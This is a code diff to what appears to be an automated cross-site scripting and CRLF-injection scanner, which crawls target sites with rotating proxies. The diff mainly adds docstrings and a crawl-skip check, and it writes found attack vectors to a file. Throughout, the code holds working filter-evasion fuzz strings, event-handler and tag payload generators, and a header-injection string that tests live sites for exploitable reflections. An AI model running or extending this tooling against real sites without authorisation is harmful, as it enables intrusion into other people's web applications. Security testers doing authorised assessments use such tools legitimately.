@@ -9,6 +9,7 @@ import bs4
 from termcolor import cprint
 from tqdm import tqdm
 from fuzzywuzzy import fuzz
+from reporting.results_manager import write_xss_vectors
 from vpn_proxies.proxies_manager import prepare_proxies
 
 
@@ -218,14 +219,16 @@ fuzzes = (  # Fuzz strings to test WAFs
     "<test OndRAgOvEr=x>",
 )
 
-minEfficiency = 90  # payloads below this efficiency will not be displayed
+# payloads below this efficiency will not be displayed
+minEfficiency = 90
 
 # attributes that have special properties
 specialAttributes = ["srcdoc", "src"]
 
 badTags = ("iframe", "title", "textarea", "noembed", "style", "template", "noscript")
 
-tags = ("html", "d3v", "a", "details")  # HTML Tags
+# HTML Tags
+tags = ("html", "d3v", "a", "details")
 
 # "Things" that can be used between js functions and breakers e.g. '};alert()//
 jFillings = ";"
@@ -233,15 +236,17 @@ jFillings = ";"
 lFillings = ("", "%0dx")
 # "Things" to use between event handler and = or between function and =
 eFillings = ("%09", "%0a", "%0d", "+")
-fillings = ("%09", "%0a", "%0d", "/+/")  # "Things" to use instead of space
-
-eventHandlers = {  # Event handlers and the tags compatible with them
+# "Things" to use instead of space
+fillings = ("%09", "%0a", "%0d", "/+/")
+# Event handlers and the tags compatible with them
+eventHandlers = {
     "ontoggle": ["details"],
     "onpointerenter": ["d3v", "details", "html", "a"],
     "onmouseover": ["a", "html", "d3v"],
 }
 
-functions = (  # JavaScript functions to get a popup
+# JavaScript functions to get a popup
+functions = (
     "[8].find(confirm)",
     "confirm()",
     "(confirm)()",
@@ -250,13 +255,9 @@ functions = (  # JavaScript functions to get a popup
     "a=prompt,a()",
 )
 
-defaultEditor = "nano"
-blindPayload = ""  # your blind XSS payload
 xsschecker = "v3dm0s"  # A non malicious string to check for reflections and stuff
 
-
-checkedForms = []  # Forms that have been checked
-
+checkedForms = {}  # Forms that have been checked
 
 # Load proxies from file
 def load_xss_payload():
@@ -277,6 +278,13 @@ def load_xss_payload():
 def generate_xss_urls(url):
     """
     Adds payload to the URL and returns a set of parsed URLs
+
+    Args:
+        url (str): The URL to generate XSS URLs for.
+
+    Returns:
+        tuple: A tuple containing a set of parsed URLs and the total number of parsed URLs.
+
     """
     xss_payloads = load_xss_payload()
     injection = "Set-Cookie:nefcore=crlfsuite;"
@@ -288,14 +296,10 @@ def generate_xss_urls(url):
     starting_strings = ["", "crlfsuite", "?crlfsuite=", "#", "__session_start__/"]
 
     if is_param:
-        # cprint(f"URL parameters: {url}", color="yellow", file=sys.stderr)
         del starting_strings[2]
         for string in starting_strings:
             for each_escape in escape_chars:
                 injected_urls = inject_params(url, string + each_escape + injection)
-                # cprint(
-                #     f"Injected URLs: {injected_urls}", color="yellow", file=sys.stderr
-                # )
                 for each_injected_url in injected_urls:
                     parsed_urls.add(each_injected_url)
 
@@ -305,7 +309,6 @@ def generate_xss_urls(url):
                 for injected in _injected:
                     parsed_urls.add(injected)
     else:
-        # cprint(f"URL non parameters: {url}", color="yellow", file=sys.stderr)
         if not url.endswith("/"):
             url = url + "/"
         for string in starting_strings:
@@ -475,7 +478,7 @@ def zetanize(response):
     return forms
 
 
-def photon_crawler(seedUrl, config, proxy):
+def photon_crawler(seedUrl, config, proxy, processed_xss_photon_crawl):
     """Crawls a website to find forms and links for XSS vulnerability testing.
 
     Args:
@@ -508,9 +511,7 @@ def photon_crawler(seedUrl, config, proxy):
             printableTarget = printableTarget[-40:]
         else:
             printableTarget = printableTarget + (" " * (40 - len(printableTarget)))
-        cprint(
-            "Parsing %s\r" % printableTarget, color="yellow", end="", file=sys.stderr
-        )
+        cprint("Parsing %s\r" % printableTarget, color="yellow", file=sys.stderr)
         url = get_url(target, True)
 
         params = get_params(target, "", True)
@@ -619,6 +620,15 @@ def photon_crawler(seedUrl, config, proxy):
             urls = storage - processed
             # urls to crawl = all urls - urls that have been crawled
 
+            if seedUrl in processed_xss_photon_crawl:
+                # TODO
+                cprint(
+                    f"Skipping already processed seedUrl: {seedUrl}",
+                    "yellow",
+                    file=sys.stderr,
+                )
+                return [forms, processed]
+
             cprint(
                 "Crawling %s urls for forms and links\r" % len(urls),
                 color="yellow",
@@ -629,12 +639,13 @@ def photon_crawler(seedUrl, config, proxy):
                 future_to_search = {
                     executor.submit(recursive_crawl, url): url for url in urls
                 }
-                for website in tqdm(
-                    concurrent.futures.as_completed(future_to_search),
-                    desc=f"Photon Crawling recursive_crawl links DB for xss website",
-                    unit="site",
-                    total=len(future_to_search),
-                ):
+                # for website in tqdm(
+                #     concurrent.futures.as_completed(future_to_search),
+                #     desc=f"Photon Crawling recursive_crawl links DB for xss website",
+                #     unit="site",
+                #     total=len(future_to_search),
+                # ):
+                for website in concurrent.futures.as_completed(future_to_search):
                     website.result()
 
             # threadpool = concurrent.futures.ThreadPoolExecutor(max_workers=30)
@@ -647,6 +658,34 @@ def photon_crawler(seedUrl, config, proxy):
 
 
 def html_xss_parser(response, encoding):
+    """Parse the HTML response for XSS vulnerabilities.
+
+    This function takes the HTTP response and the encoding as input and analyzes the response for XSS vulnerabilities.
+    It identifies the positions and contexts of potential XSS vulnerabilities in the response.
+
+    Args:
+        response (requests.Response): The HTTP response object.
+        encoding (function): The encoding function to be used for encoding the probe.
+
+    Returns:
+        dict: A dictionary containing the positions, contexts, and details of potential XSS vulnerabilities.
+            The dictionary has the following structure:
+            {
+                position: {
+                    "position": int,
+                    "context": str,
+                    "details": {
+                        "tag": str (only for "attribute" context),
+                        "type": str (only for "attribute" context),
+                        "quote": str (only for "attribute" context),
+                        "value": str (only for "attribute" context),
+                        "name": str (only for "attribute" context),
+                        "badTag": str (only if the position is in a non-executable context)
+                    }
+                },
+                ...
+            }
+    """
     rawResponse = response  # raw response returned by requests
     response = response.text  # response content
     if encoding:  # if the user has specified an encoding, encode the probe in that
@@ -758,6 +797,29 @@ def html_xss_parser(response, encoding):
 
 
 def checker(config, proxy, url, params, GET, payload, positions, encoding):
+    """Check the efficiency of XSS filter evasion payloads.
+
+    This function sends a request to the target URL with different XSS payloads and
+    measures the efficiency of each payload in evading XSS filters. It returns a list
+    of efficiency scores for each occurrence of the payload in the response.
+
+    Args:
+        config (dict): The configuration settings.
+        proxy (str): The proxy server to use.
+        url (str): The target URL.
+        params (dict): The parameters to inject payloads into.
+        GET (bool): Flag indicating if the request is a GET request.
+        payload (str): The payload to test for XSS vulnerability.
+        positions (list): The positions of the reflected payload in the response.
+        encoding (bool): Flag indicating if the payloads should be URL encoded.
+
+    Returns:
+        list: The efficiency scores of the payloads for each occurrence.
+
+    Raises:
+        IndexError: If an index error occurs while processing the response.
+
+    """
     checkString = "st4r7s" + payload + "3nd"
     if encoding:
         checkString = encoding(unquote(checkString))
@@ -821,19 +883,19 @@ def checker(config, proxy, url, params, GET, payload, positions, encoding):
 
 
 def check_filter_efficiency(config, proxy, url, params, GET, occurences, encoding):
-    """_summary_
+    """Check the efficiency of XSS filter evasion payloads.
 
     Args:
-        config (_type_): _description_
-        proxy (_type_): _description_
-        url (_type_): _description_
-        params (_type_): _description_
-        GET (_type_): _description_
-        occurences (_type_): _description_
-        encoding (_type_): _description_
+        config (dict): The configuration settings.
+        proxy (str): The proxy server to use.
+        url (str): The target URL.
+        params (dict): The parameters to inject payloads into.
+        GET (bool): Flag indicating if the request is a GET request.
+        occurences (dict): The occurrences of XSS vulnerabilities.
+        encoding (bool): Flag indicating if the payloads should be URL encoded.
 
     Returns:
-        _type_: _description_
+        dict: The efficiency scores of the payloads for each occurrence.
     """
     positions = occurences.keys()
     sortedEfficiencies = {}
@@ -885,6 +947,28 @@ def random_upper(string):
 def genGen(
     fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag=None
 ):
+    """Generate XSS attack vectors based on the provided parameters.
+
+    This function generates XSS attack vectors by combining different fillings, event handlers, tags, functions, and ends.
+    It takes the following parameters:
+
+    Args:
+        fillings (list): A list of fillings to be used in the attack vectors.
+        eFillings (list): A list of event fillings to be used in the attack vectors.
+        lFillings (list): A list of location fillings to be used in the attack vectors.
+        eventHandlers (list): A list of event handlers to be used in the attack vectors.
+        tags (list): A list of tags to be used in the attack vectors.
+        functions (list): A list of functions to be used in the attack vectors.
+        ends (list): A list of ends to be used in the attack vectors.
+        badTag (str, optional): A bad tag to be used in the attack vectors. Defaults to None.
+
+    Returns:
+        list: A list of generated XSS attack vectors.
+
+    Note:
+        - The `fillings`, `eFillings`, `lFillings`, `eventHandlers`, `tags`, `functions`, and `ends` parameters should be non-empty lists.
+        - The `badTag` parameter is optional. If provided, it will be used in the attack vectors.
+    """
     vectors = []
     r = random_upper  # random_upper randomly converts chars of a string to uppercase
     for tag in tags:
@@ -925,6 +1009,19 @@ def genGen(
 
 
 def js_contexter(script):
+    """Extracts JavaScript context from a given script.
+
+    This function takes a script as input and extracts the JavaScript context from it.
+    It removes everything that is between {..}, "..." or '...' and performs additional
+    character replacements to obtain the JavaScript context.
+
+    Args:
+        script (str): The input script from which the JavaScript context needs to be extracted.
+
+    Returns:
+        str: The extracted JavaScript context.
+
+    """
     broken = script.split(xsschecker)
     pre = broken[0]
     #  remove everything that is between {..}, "..." or '...'
@@ -960,6 +1057,27 @@ def js_contexter(script):
 
 
 def generator(occurences, response):
+    """
+    This function takes in two parameters: 'occurences' and 'response'.
+    'occurences' is a dictionary containing information about occurrences of potential XSS vulnerabilities.
+    'response' is the response received from the server.
+
+    The function first extracts JavaScript code snippets from the 'response' using the 'js_extractor' function.
+
+    It then initializes an empty dictionary called 'vectors' to store the generated XSS payloads.
+
+    The function iterates over each occurrence in the 'occurences' dictionary. For each occurrence, it checks the 'context' value to determine the type of vulnerability.
+
+    If the context is 'html', it checks the efficiency scores for the '<' and '>' characters. If the efficiency score for '>' is 100, it adds the generated payloads to the 'vectors' dictionary.
+
+    If the context is 'attribute', it checks the efficiency scores for the quote character and '>'. If both scores are 100, it adds the generated payloads to the 'vectors' dictionary.
+
+    If the context is 'comment', it checks the efficiency score for the '<' character. If the score is 100, it adds the generated payloads to the 'vectors' dictionary.
+
+    If the context is 'script', it extracts the JavaScript code snippet corresponding to the occurrence. It then checks the efficiency scores for the '</scRipT/>' and '>' characters. If the score for '</scRipT/>' is 100, it adds the generated payloads to the 'vectors' dictionary.
+
+    Finally, the function returns the 'vectors' dictionary containing the generated XSS payloads.
+    """
     scripts = js_extractor(response)
     index = 0
     vectors = {
@@ -1203,17 +1321,17 @@ def generator(occurences, response):
 def attacker_crawler(
     scheme, host, main_url, form, blindPayload, encoding, config, proxy
 ):
-    """_summary_
+    """Attacks a web application by crawling and testing XSS vulnerabilities.
 
     Args:
-        scheme (_type_): _description_
-        host (_type_): _description_
-        main_url (_type_): _description_
-        form (_type_): _description_
-        blindPayload (_type_): _description_
-        encoding (_type_): _description_
-        config (_type_): _description_
-        proxy (_type_): _description_
+        scheme (str): The scheme (http or https) of the target web application.
+        host (str): The host of the target web application.
+        main_url (str): The main URL of the target web application.
+        form (dict): The form data of the target web application.
+        blindPayload (str): The blind payload to test for blind XSS vulnerabilities.
+        encoding (str): The encoding to use for the payloads.
+        config (dict): The configuration settings for the attack.
+        proxy (str): The proxy server to use for the attack.
     """
     if form:
         for each in form.values():
@@ -1247,7 +1365,6 @@ def attacker_crawler(
                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                 "Accept-Language": "en-US,en;q=0.5",
                                 "Accept-Encoding": "gzip,deflate",
-                                "accept-language": "en-US,en;q=0.9",
                                 "cache-control": "max-age=0",
                                 "Connection": "close",
                                 "DNT": "1",
@@ -1287,15 +1404,22 @@ def attacker_crawler(
                                     try:
                                         payload = list(vects)[0]
                                         cprint(
-                                            "Vulnerable webpage: %s%s%s"
+                                            "[Vulnerable webpage] - %s%s%s"
                                             % (green, url, end),
                                             color="green",
                                             file=sys.stderr,
                                         )
                                         cprint(
                                             "Vector for %s%s%s: %s"
-                                            % (green, paramName, end, payload)
+                                            % (green, paramName, end, payload),
+                                            color="green",
+                                            file=sys.stderr,
                                         )
+                                        # TODO add to report more cleanly
+                                        write_xss_vectors(
+                                            vectors, "outputs/xss_vectors.txt"
+                                        )
+                                        # TODO open selenium and perform attack to take screenshot
                                         break
                                     except IndexError:
                                         pass
@@ -1307,7 +1431,7 @@ def attacker_crawler(
                                     file=sys.stderr,
                                 )
                                 proxies = prepare_proxies(proxy, config)
-                                start_request(
+                                response = start_request(
                                     proxies=proxies,
                                     config=config,
                                     base_url=url,
